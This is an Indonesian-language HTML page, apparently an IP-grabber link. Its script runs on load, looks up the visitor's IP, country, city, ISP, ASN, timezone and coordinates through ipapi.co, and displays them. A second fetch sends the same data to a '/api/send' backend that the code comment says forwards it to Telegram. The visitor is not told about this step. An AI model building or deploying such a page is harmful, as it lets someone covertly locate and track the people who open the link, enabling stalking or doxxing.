<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Melacak IP...</title>
</head>
<body>
  <h3 id="status">🔎 Melacak lokasi...</h3>
  <pre id="result"></pre>

  <script>
    async function getIP() {
      try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();

        const info = `
🌐 <b>Hasil Pelacakan IP</b>

📍 <b>IP:</b> ${data.ip}
🌍 <b>Negara:</b> ${data.country_name}
🏙 <b>Kota:</b> ${data.city}, ${data.region}
🛰 <b>ISP:</b> ${data.org}
🏢 <b>Org:</b> ${data.org}
⚡ <b>ASN:</b> ${data.asn}
⌚ <b>Zona Waktu:</b> ${data.timezone}
📌 <b>Koordinat:</b> ${data.latitude}, ${data.longitude}

🔗 <a href="https://www.google.com/maps?q=${data.latitude},${data.longitude}">Lihat di Maps</a>
        `.trim();

        // Tampilkan ke user
        document.getElementById("status").textContent = "✅ IP berhasil dilacak";
        document.getElementById("result").textContent = info;

        // Kirim ke Telegram via API backend
        const send = await fetch("/api/send", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({ text: info })
        });

        const result = await send.json();
        if (!result.ok) {
          console.error("Gagal kirim ke Telegram:", result);
        }

      } catch (err) {
        document.getElementById("status").textContent = "❌ Gagal melacak IP";
        console.error("ERROR:", err);
      }
    }

    getIP();
  </script>
</body>
</html>
